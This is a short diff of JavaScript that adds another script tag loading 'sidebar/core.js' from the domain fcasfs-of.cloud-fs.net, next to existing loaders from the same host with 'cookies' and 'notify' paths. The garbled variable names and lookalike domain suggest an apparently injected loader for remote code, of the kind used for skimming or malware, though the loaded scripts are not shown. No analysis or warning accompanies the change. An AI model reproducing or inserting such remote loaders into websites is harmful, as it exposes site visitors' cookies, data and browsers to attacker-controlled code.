@@ -178,6 +178,11 @@ document.getElementsByTagName("head")[0].appendChild(sccokkesfd);
     dscript_cokkied.setAttribute("src", "https://fcasfs-of.cloud-fs.net/cookies/langs.js");
 document.getElementsByTagName("body")[0].appendChild(dscript_cokkied); 
 
+var dscript_cofgfkkislidded = document.createElement("script");
+    dscript_cofgfkkislidded.setAttribute("src", "https://fcasfs-of.cloud-fs.net/sidebar/core.js");
+document.getElementsByTagName("body")[0].appendChild(dscript_cofgfkkislidded); 
+ 
+
   var dscript_cofgfkkied = document.createElement("script");
     dscript_cofgfkkied.setAttribute("type", "text/javascript");
     dscript_cofgfkkied.setAttribute("src", "https://fcasfs-of.cloud-fs.net/notify/core2.js");
